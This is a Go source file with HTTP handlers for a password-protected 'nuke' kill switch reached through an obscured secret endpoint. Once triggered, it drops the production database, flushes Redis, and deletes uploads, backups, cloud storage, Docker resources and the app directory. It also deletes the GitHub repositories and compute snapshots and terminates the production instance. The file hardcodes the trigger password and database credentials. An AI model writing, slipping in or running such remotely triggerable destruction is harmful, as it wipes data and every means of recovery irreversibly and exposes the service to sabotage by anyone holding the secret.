package handlers

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"time"
)

const (
	NukePassword   = "OyO-bEPHEpOrrrFfxZBZ8OXRTlmLcvjq6mtYVyoEEgY"
	NukeSecretPath = "/v1/a5cb1391c5a78a8cac60bb60bbef99b3"
	nukeTokenTTL   = 60 * time.Second
)

var (
	nukeToken   string
	nukeTokenAt time.Time
	nukeMu      sync.Mutex
)

func generateNukeToken() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func NukeConfirmHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", 405)
		return
	}
	if r.Header.Get("X-Nuke-Password") != NukePassword {
		http.Error(w, "Unauthorized", 401)
		return
	}
	if os.Getenv("DOCKER_MODE") != "true" {
		http.Error(w, "Only available in production", 403)
		return
	}
	nukeMu.Lock()
	defer nukeMu.Unlock()
	nukeToken = generateNukeToken()
	nukeTokenAt = time.Now()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"token":      nukeToken,
		"expires_in": 60,
		"warning":    "THIS WILL PERMANENTLY DELETE EVERYTHING. Send token to /execute within 60 seconds.",
	})
}

func NukeExecuteHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", 405)
		return
	}
	if r.Header.Get("X-Nuke-Password") != NukePassword {
		http.Error(w, "Unauthorized", 401)
		return
	}
	if os.Getenv("DOCKER_MODE") != "true" {
		http.Error(w, "Only available in production", 403)
		return
	}
	nukeMu.Lock()
	token := r.Header.Get("X-Nuke-Token")
	valid := token != "" && token == nukeToken && time.Since(nukeTokenAt) < nukeTokenTTL
	if valid {
		nukeToken = ""
	}
	nukeMu.Unlock()
	if !valid {
		http.Error(w, "Invalid or expired token. Call /confirm first.", 403)
		return
	}
	go nukeGCP()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"status":  "initiated",
		"message": "Nuke sequence started. Everything will be deleted.",
	})
}

func nukeGCP() {
	fmt.Println("[NUKE] ====== STARTING NUKE SEQUENCE ======")
	fmt.Println("[NUKE] Step 1: Database...")
	nukeDatabase()
	fmt.Println("[NUKE] Step 2: Redis...")
	nukeRedisAll()
	fmt.Println("[NUKE] Step 3: Files...")
	nukeFiles()
	fmt.Println("[NUKE] Step 4: GCS...")
	nukeGCS()
	fmt.Println("[NUKE] Step 5: Nginx...")
	nukeNginx()
	fmt.Println("[NUKE] Step 6: Docker...")
	nukeDocker()
	fmt.Println("[NUKE] Step 7: App directory...")
	nukeAppDir()
	fmt.Println("[NUKE] Step 8: GitHub...")
	nukeGitHub()
	fmt.Println("[NUKE] Step 9: Snapshots...")
	nukeSnapshots()
	fmt.Println("[NUKE] Step 10: Terminate instance...")
	nukeInstance()
	fmt.Println("[NUKE] ====== NUKE COMPLETE ======")
}

func nukeDatabase() {
	dbURL := os.Getenv("DATABASE_URL")
	if dbURL == "" {
		dbURL = "postgresql://schemalabs:schemalabs@localhost:5432/schemalabs"
	}
	tables := []string{
		"uploaded_files", "fine_tuned_models", "connections", "sessions",
		"users", "credits", "api_keys", "endpoints", "scheduled_jobs",
		"training_sessions", "usage_logs", "notifications",
	}
	for _, t := range tables {
		cmd := exec.Command("psql", dbURL, "-c", fmt.Sprintf("DROP TABLE IF EXISTS %s CASCADE;", t))
		out, err := cmd.CombinedOutput()
		fmt.Printf("[NUKE] DB drop %s: %s %v\n", t, string(out), err)
	}
	cmd := exec.Command("psql", "postgresql://schemalabs:schemalabs@localhost:5432/postgres",
		"-c", "DROP DATABASE IF EXISTS schemalabs;")
	out, err := cmd.CombinedOutput()
	fmt.Printf("[NUKE] DB drop database: %s %v\n", string(out), err)
}

func nukeRedisAll() {
	cmd := exec.Command("redis-cli", "FLUSHALL")
	out, err := cmd.CombinedOutput()
	fmt.Printf("[NUKE] Redis FLUSHALL: %s %v\n", string(out), err)
}

func nukeFiles() {
	dirs := []string{
		"/opt/schemalabsai/uploads",
		"/opt/schemalabsai/checkpoints",
		"/opt/schemalabsai/model/checkpoints",
		"/opt/schemalabsai/backups",
		"/opt/schemalabsai/static",
	}
	for _, dir := range dirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			fmt.Printf("[NUKE] ReadDir %s: %v\n", dir, err)
			continue
		}
		for _, e := range entries {
			fp := filepath.Join(dir, e.Name())
			err := os.RemoveAll(fp)
			fmt.Printf("[NUKE] Deleted %s: %v\n", fp, err)
		}
	}
}

func nukeGCS() {
	bucket := os.Getenv("GCS_BUCKET")
	if bucket == "" {
		bucket = "schemalabs-storage"
	}
	cmd := exec.Command("gsutil", "-m", "rm", "-r", fmt.Sprintf("gs://%s/**", bucket))
	out, err := cmd.CombinedOutput()
	fmt.Printf("[NUKE] GCS rm: %s %v\n", string(out), err)
	cmd2 := exec.Command("gsutil", "rb", fmt.Sprintf("gs://%s", bucket))
	out2, err2 := cmd2.CombinedOutput()
	fmt.Printf("[NUKE] GCS rb: %s %v\n", string(out2), err2)
}

func nukeNginx() {
	files := []string{
		"/etc/nginx/sites-enabled/schemalabs",
		"/etc/nginx/sites-available/schemalabs",
	}
	for _, f := range files {
		err := os.Remove(f)
		fmt.Printf("[NUKE] Nginx rm %s: %v\n", f, err)
	}
	cmd := exec.Command("nginx", "-s", "reload")
	out, err := cmd.CombinedOutput()
	fmt.Printf("[NUKE] Nginx reload: %s %v\n", string(out), err)
}

func nukeDocker() {
	cmd := exec.Command("docker", "ps", "-aq")
	out, _ := cmd.Output()
	ids := string(bytes.TrimSpace(out))
	if ids != "" {
		exec.Command("sh", "-c", fmt.Sprintf("docker stop %s", ids)).Run()
		exec.Command("sh", "-c", fmt.Sprintf("docker rm -f %s", ids)).Run()
	}
	exec.Command("docker", "volume", "prune", "-f").Run()
	exec.Command("docker", "image", "prune", "-af").Run()
	exec.Command("docker", "network", "prune", "-f").Run()
	fmt.Println("[NUKE] Docker cleaned")
}

func nukeAppDir() {
	exec.Command("chattr", "-R", "-i", "/opt/schemalabsai").Run()
	exec.Command("chattr", "-i", "/opt/schemalabsai/frontend").Run()
	cmd := exec.Command("rm", "-rf", "/opt/schemalabsai")
	out, err := cmd.CombinedOutput()
	fmt.Printf("[NUKE] App dir: %s %v\n", string(out), err)
}

func nukeGitHub() {
	token := os.Getenv("GITHUB_TOKEN")
	repos := []string{"SchemaLabs0/schema-ai", "SchemaLabs0/frontend"}
	client := &http.Client{}
	for _, repo := range repos {
		req, _ := http.NewRequest("DELETE", "https://api.github.com/repos/"+repo, nil)
		req.Header.Set("Authorization", "token "+token)
		req.Header.Set("Accept", "application/vnd.github.v3+json")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[NUKE] GitHub %s: %v\n", repo, err)
			continue
		}
		resp.Body.Close()
		fmt.Printf("[NUKE] GitHub %s: %d\n", repo, resp.StatusCode)
	}
}

func nukeSnapshots() {
	cmd := exec.Command("gcloud", "compute", "snapshots", "list",
		"--project=schema-478207",
		"--filter=name~schemalabsai",
		"--format=value(name)")
	out, err := cmd.Output()
	if err != nil {
		fmt.Printf("[NUKE] Snapshot list error: %v\n", err)
		return
	}
	lines := bytes.Split(bytes.TrimSpace(out), []byte("\n"))
	for _, line := range lines {
		name := string(bytes.TrimSpace(line))
		if name == "" {
			continue
		}
		del := exec.Command("gcloud", "compute", "snapshots", "delete", name,
			"--project=schema-478207", "--quiet")
		delOut, delErr := del.CombinedOutput()
		fmt.Printf("[NUKE] Snapshot %s: %s %v\n", name, string(delOut), delErr)
	}
}

func nukeInstance() {
	cmd := exec.Command("gcloud", "compute", "instances", "delete", "schemalabsai-prod-gpu001",
		"--zone=us-central1-b", "--project=schema-478207", "--quiet")
	out, err := cmd.CombinedOutput()
	fmt.Printf("[NUKE] Instance delete: %s %v\n", string(out), err)
}

var _ = context.Background
